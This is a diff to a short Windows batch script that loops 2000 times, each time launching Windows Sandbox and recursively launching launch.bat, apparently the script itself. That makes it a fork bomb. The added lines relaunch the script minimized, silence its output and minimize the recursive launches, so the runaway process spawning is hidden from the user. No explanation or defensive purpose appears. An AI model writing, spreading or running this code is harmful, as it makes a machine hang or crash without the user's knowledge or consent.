@@ -1,5 +1,6 @@
+@echo off
+if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
 FOR /L %%A IN (1,1,2000) DO (
 start "C:\Windows\System32\WindowsSandbox.exe"
-start "C:\Windows\System32\WindowsSandbox.exe"
-start ".\launch.bat"
+start /MIN "" ".\launch.bat"
 )
